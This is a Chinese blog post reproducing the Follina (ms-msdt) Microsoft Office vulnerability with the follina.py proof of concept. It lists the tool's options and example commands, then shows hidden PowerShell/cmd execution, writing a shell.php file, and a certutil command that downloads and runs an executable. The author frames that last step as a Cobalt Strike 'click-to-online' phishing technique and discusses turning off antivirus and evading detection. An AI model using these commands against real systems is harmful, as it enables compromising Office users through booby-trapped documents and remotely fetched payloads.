## 一、漏洞简介

近日，网络安全研究员nao_sec发现了一个从白俄罗斯上传至分析服务网站VirusTotal的恶意Word文档（文件名为" 05-2022-0438.doc
"）。这个文档使用远程模板特性获取HTML，然后使用“ms-msdt”方案执行PowerShell代码。

随后，知名网络安全专家Kevin Beaumont发表了对该漏洞的分析。“该文档使用
Word远程模板功能从远程网络服务器检索HTML文件，该服务器又使用ms-msdt MSProtocol URI方案加载一些代码并执行一些
PowerShell”，在他的分析中这样写道，“这里发生的一些事情比较复杂，而首当其冲的问题是即使禁用了宏，Microsoft Word
也会通过msdt（一种支持工具）执行代码。受保护的视图确实起了作用，可尽管如果您将文档更改为RTF形式，它甚至无需打开文档，仅通过资源管理器中的预览选项卡即可运行，更不用说受保护的视图了。”

## 二、影响范围

据了解，该零日漏洞会影响多个Microsoft Office版本，包括Office、Office2016和Office 2021。

以上说明来源：https://www.freebuf.com/articles/334861.html

复现运行环境应该关闭防火墙杀毒软件等安全应用，会被拦截；

POC来源地址：https://github.com/chvancooten/follina.py

## 三、使用说明

    
    
    python .\follina.py -h
    用法：follina.py [-h] -m {command,binary} [-b BINARY] [-c COMMAND] [-u URL] [-H HOST] [-p PORT]
    
    选项：
      -h, --help 显示此帮助信息并退出
    
    所需参数：
      -m {命令，二进制}，--mode {命令，二进制}
                            执行模式，可以是“二进制”以加载（远程）二进制文件，或“命令”以运行编码的 PS 命令
    
    二进制执行参数：
      -b 二进制，--二进制二进制
    
    命令执行参数：
      -c 命令，--command 命令
     在“命令”模式下执行的编码命令
    
    可选参数：
      -u URL, --url URL 生成的文档应该在其中检索您的有效负载的主机名或 IP 地址，默认为“localhost”
      -H HOST, --host HOST Web服务器监听的接口，默认为所有接口（0.0.0.0）
      -p PORT, --port PORT 运行 HTTP 服务器的端口，默认为 80

使用举例：

    
    
    # 执行本地二进制
    python .\follina.py -m 二进制 -b \windows\system32\calc.exe
    
    # 在 linux 上你可能需要转义反斜杠
    python .\follina.py -m 二进制 -b \\windows\\system32\\calc.exe
    
    # 从文件共享中执行二进制文件
    python .\follina.py -m binary -b \\localhost\c$\windows\system32\calc.exe
    
    # 执行任意powershell命令
    python .\follina.py -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c echoowned > c:\users\public\owned.txt'"
    
    # 在默认接口（所有接口，0.0.0.0）上运行 Web 服务器，但告诉恶意文档在 http://1.2.3.4/exploit.html 检索它
    python .\follina.py -m 二进制 -b \windows\system32\calc.exe -u 1.2.3.4
    
    # 只在 localhost 上运行网络服务器，在端口 8080 而不是 80
    python .\follina.py -m 二进制 -b \windows\system32\calc.exe -H 127.0.0.1 -P 8080

``

## 四、环境配置

虚拟机Windows server 2019（请在测试环境运行）

OFFICE 2019专业版

关闭火绒等杀毒软件、关闭Defender

## 五、上线过程

第一次运行会生成clickme.docx文件以及WWW文件夹，exploit.html文件就在WWW文件夹里面， -WindowStyle hidden
-ArgumentList是静默运行，所以看不到cmd界面，更加隐蔽。

命令：python .\follina.py -m binary -b \\\localhost\c$\windows\system32\calc.exe
会弹出计算器，说明漏洞复现成功，如下：

![1654055423_6296e1ffede076b4f7327.png!small](https://image.3001.net/images/20220601/1654055423_6296e1ffede076b4f7327.png!small)

既然可以弹出计算器，我有一个思路，写入shell文件或者执行CMD，并执行命令进行远程服务器下载CS木马运行，这样就能够达到点击即上线，钓鱼一绝（不考虑查杀原因）。

### 写入shell.php

命令：python .\follina.py -m command -c "Start-Process
c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c echo
cmd_test > c:\users\public\shell.php'" 如下

![1654054985_6296e049f211a589eb0f3.png!small](https://image.3001.net/images/20220601/1654054985_6296e049f211a589eb0f3.png!small)

### 上线运行CS

命令：python .\follina.py -m command -c "Start-Process
c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c certutil
-urlcache -split -f http://127.0.0.1:8080/test.exe&start test.exe'"

![1654060819_6296f713aaf8d16a70c56.png!small](https://image.3001.net/images/20220601/1654060819_6296f713aaf8d16a70c56.png!small)

## 六、总结

总体来说如果能够解决报毒问题，该漏洞还是有较大的操作空间。以上只是自己个人想法，菜鸡一枚。

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。

